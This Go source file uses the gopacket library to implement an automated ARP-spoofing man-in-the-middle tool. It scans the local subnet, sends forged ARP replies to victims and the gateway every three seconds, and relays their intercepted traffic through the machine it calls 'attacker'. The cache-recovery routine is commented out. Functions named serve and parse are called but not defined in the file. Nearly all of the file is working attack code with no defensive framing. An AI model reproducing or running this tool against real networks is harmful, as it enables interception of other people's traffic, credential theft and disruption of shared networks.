package main

import (
	"bytes"
	"fmt"
	"log"
	"math"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type AddressPair struct {
	DstHwAddress   []byte
	DstProtAddress []byte
	SrcHwAddress   []byte
	SrcProtAddress []byte
}

type Host struct {
	IP      []byte
	MAC     []byte
	Netmask []byte
}

type Session struct {
	Sender   *Host
	Receiver *Host
}

var (
	snapshotLen = int32(math.MaxInt32)
	promiscuous = false
	timeout     = time.Millisecond

	options gopacket.SerializeOptions

	broadcast = []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
	zerofill  = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}

	wsCh = make(chan string)
)

func main() {
	go serve()

	wg := new(sync.WaitGroup)
	for _, device := range findAllAbleDevs() {
		attacker := &Host{}
		attacker.getLocalhostInfomation(device)
		if len(attacker.MAC) == 0 {
			continue
		}

		go parse(device)

		sessionCh, err := attacker.getSessionChan(device)
		if err != nil {
			log.Println(device.Name, err)
			continue
		}

		wg.Add(1)
		go func(device pcap.Interface, sessionCh chan *Session) {
			defer wg.Done()
			for session := range sessionCh {
				log.Println("Session Detected.", session)
				handle, err := openPcap(device, "ip")
				if err != nil {
					log.Println(err)
					return
				}
				go session.infect(handle, attacker)
				go session.relay(handle, attacker)
			}
		}(device, sessionCh)
	}
	wg.Wait()
}

func findAllAbleDevs() (ret []pcap.Interface) {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		log.Fatal(err)
	}
	for _, device := range devices {
		ok := false
		for _, addr := range device.Addresses {
			if len(addr.IP) == 4 {
				ok = true
				break
			}
		}
		if !ok {
			continue
		}
		ret = append(ret, device)
	}
	return
}

func openPcap(device pcap.Interface, filter string) (*pcap.Handle, error) {
	return pcap.OpenLive(device.Name, snapshotLen, promiscuous, timeout)
}

func (h *Host) getLocalhostInfomation(device pcap.Interface) {
	for _, inf := range device.Addresses {
		if len(inf.IP) == 4 {
			h.IP = inf.IP
			h.Netmask = inf.Netmask
		}
	}
	infs, err := net.Interfaces()
	if err != nil {
		fmt.Println(err)
	}
	for _, inf := range infs {
		addrs, err := inf.Addrs()
		if err != nil {
			fmt.Println(err)
			continue
		}
		ip := []byte{}
		for _, addr := range addrs {
			switch v := addr.(type) {
			case *net.IPNet:
				ip = []byte(v.IP)[len(v.IP)-4:]
				break
			}
		}
		if bytes.Equal([]byte(ip), h.IP) {
			h.MAC = []byte(inf.HardwareAddr)
		}
	}
}

// only work on C class
func (h *Host) getSessionChan(device pcap.Interface) (chan *Session, error) {
	ch := make(chan *Session)
	prefixSize, _ := net.IPMask(h.Netmask).Size()
	cidr := net.IP(h.IP).String() + "/" + strconv.Itoa(prefixSize)
	ip, ipnet, err := net.ParseCIDR(cidr)
	if err != nil {
		close(ch)
		return nil, err
	}
	inc := func(ip net.IP) {
		for i := len(ip) - 1; i >= 0; i-- {
			ip[i]++
			if ip[i] > 0 {
				break
			}
		}
	}
	hostInNetwork := []net.IP{}
	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
		ipCopy := make(net.IP, len(ip))
		copy(ipCopy, ip)
		if bytes.Equal(h.IP, ipCopy) {
			continue
		}
		hostInNetwork = append(hostInNetwork, ipCopy)
	}

	hostInNetwork = hostInNetwork[1 : len(hostInNetwork)-1]

	handle, err := openPcap(device, "arp")
	if err != nil {
		return nil, err
	}
	go recvARP(handle, hostInNetwork, ch)
	go h.infinitySendARP(handle, hostInNetwork)

	return ch, nil
}

func (h *Host) infinitySendARP(handle *pcap.Handle, IPs []net.IP) {
	for len(IPs) > 0 {
		for _, IP := range IPs {
			sendARP(handle, &AddressPair{
				DstProtAddress: IP,
				DstHwAddress:   broadcast,
				SrcProtAddress: h.IP,
				SrcHwAddress:   h.MAC,
			}, layers.ARPRequest)
		}
		time.Sleep(time.Second * 10)
	}
}

// func (s *Session) recovery(attacker *Host) {
// 	ticker1sec := time.Tick(time.Second * 1)
// 	ticker10sec := time.Tick(time.Second * 10)
// 	for {
// 		select {
// 		case <-ticker1sec:
// 			sendARP(handle, &AddressPair{
// 				DstProtAddress: s.Sender.IP,
// 				DstHwAddress:   s.Sender.MAC,
// 				SrcProtAddress: attacker.IP,
// 				SrcHwAddress:   attacker.MAC,
// 			}, layers.ARPReply)
// 			sendARP(handle, &AddressPair{
// 				DstProtAddress: s.Receiver.IP,
// 				DstHwAddress:   s.Receiver.MAC,
// 				SrcProtAddress: s.Sender.IP,
// 				SrcHwAddress:   s.Sender.MAC,
// 			}, layers.ARPReply)
// 		case <-ticker10sec:
// 			log.Println("Recovered.", s)
// 			return
// 		}
// 	}
// }

func (s *Session) infect(handle *pcap.Handle, attacker *Host) {
	ticker3sec := time.Tick(time.Second * 3)
	// ticker3min := time.Tick(time.Minute * 3)
	log.Println("Infection Start.", s)
	for {
		select {
		case <-ticker3sec:
			sendARP(handle, &AddressPair{
				DstProtAddress: s.Sender.IP,
				DstHwAddress:   s.Sender.MAC,
				SrcProtAddress: s.Receiver.IP,
				SrcHwAddress:   attacker.MAC,
			}, layers.ARPReply)
			sendARP(handle, &AddressPair{
				DstProtAddress: s.Receiver.IP,
				DstHwAddress:   s.Receiver.MAC,
				SrcProtAddress: s.Sender.IP,
				SrcHwAddress:   attacker.MAC,
			}, layers.ARPReply)
			sendARP(handle, &AddressPair{
				DstProtAddress: s.Receiver.IP,
				DstHwAddress:   s.Receiver.MAC,
				SrcProtAddress: attacker.IP,
				SrcHwAddress:   attacker.MAC,
			}, layers.ARPRequest)
			// case <-ticker3min:
			// 	log.Println("Infection End.", s)
			// 	s.recovery(attacker)
			// 	return
		}
	}
}

func (s *Session) relay(handle *pcap.Handle, attacker *Host) {
	var eth layers.Ethernet
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth)
		decoded := []gopacket.LayerType{}
		parser.DecodeLayers(packet.Data(), &decoded)
		for _, layerType := range decoded {
			if layerType == layers.LayerTypeEthernet {
				if eth.EthernetType != layers.EthernetTypeIPv4 {
					continue
				}
				switch {
				case bytes.Equal(eth.SrcMAC, s.Sender.MAC):
					eth.DstMAC = s.Receiver.MAC
					eth.SrcMAC = attacker.MAC
				case bytes.Equal(eth.SrcMAC, s.Receiver.MAC):
					eth.DstMAC = s.Sender.MAC
					eth.SrcMAC = attacker.MAC
				default:
					continue
				}

				buffer := gopacket.NewSerializeBuffer()
				gopacket.SerializeLayers(buffer, options,
					&eth,
					gopacket.Payload(eth.Payload),
				)
				outgoingPacket := buffer.Bytes()
				handle.WritePacketData(outgoingPacket)
			}
		}
	}
}

func recvARP(handle *pcap.Handle, IPs []net.IP, ch chan *Session) {
	gateway := &Host{IP: IPs[0]}
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for packet := range packetSource.Packets() {
		if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
			arp := arpLayer.(*layers.ARP)
			if bytes.Equal(arp.SourceProtAddress, gateway.IP) {
				gateway.MAC = arp.SourceHwAddress
				break
			}
		}
	}
	IPs = IPs[1:]
	match := func(IPs []net.IP, targetIP net.IP) (bool, int) {
		for i, IP := range IPs {
			if bytes.Equal(IP, targetIP) {
				return true, i
			}
		}
		return false, -1
	}

	var eth layers.Ethernet
	var arp layers.ARP
	for packet := range packetSource.Packets() {
		parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet,
			&eth, &arp)
		decoded := []gopacket.LayerType{}
		parser.DecodeLayers(packet.Data(), &decoded)
		for _, layerType := range decoded {
			switch layerType {
			case layers.LayerTypeARP:
				if arp.Operation != layers.ARPReply {
					continue
				}
				if ok, i := match(IPs, arp.SourceProtAddress); ok {
					sender := &Host{
						IP:  arp.SourceProtAddress,
						MAC: arp.SourceHwAddress,
					}
					ch <- &Session{Sender: sender, Receiver: gateway}
					IPs = append(IPs[:i], IPs[i+1:]...)
				}
			}
		}
	}
}

func sendARP(handle *pcap.Handle, addressPair *AddressPair, operation uint16) {
	arpLayer := &layers.ARP{
		AddrType:        layers.LinkTypeEthernet,
		Protocol:        layers.EthernetTypeIPv4,
		HwAddressSize:   byte(6),
		ProtAddressSize: byte(4),
		DstHwAddress: func() []byte {
			if bytes.Equal(addressPair.DstHwAddress, broadcast) {
				return zerofill
			}
			return addressPair.DstHwAddress
		}(),
		DstProtAddress:    addressPair.DstProtAddress,
		SourceHwAddress:   addressPair.SrcHwAddress,
		SourceProtAddress: addressPair.SrcProtAddress,
		Operation:         operation,
	}
	ethernetLayer := &layers.Ethernet{
		SrcMAC:       net.HardwareAddr(addressPair.SrcHwAddress),
		DstMAC:       net.HardwareAddr(addressPair.DstHwAddress),
		EthernetType: layers.EthernetTypeARP,
	}
	buffer := gopacket.NewSerializeBuffer()
	gopacket.SerializeLayers(buffer, options,
		ethernetLayer,
		arpLayer,
	)
	outgoingPacket := buffer.Bytes()
	handle.WritePacketData(outgoingPacket)
}

func (s *Session) String() string {
	return fmt.Sprint(s.Sender.String())
}

func (h *Host) String() string {
	return "IP:" + net.IP(h.IP).String() + " " + func() string {
		if len(h.MAC) == 0 {
			return ""
		}
		bufs := []string{}
		for _, v := range h.MAC {
			bufs = append(bufs, fmt.Sprintf("%02x", v))
		}
		return "MAC:" + strings.Join(bufs, ":")
	}()
}
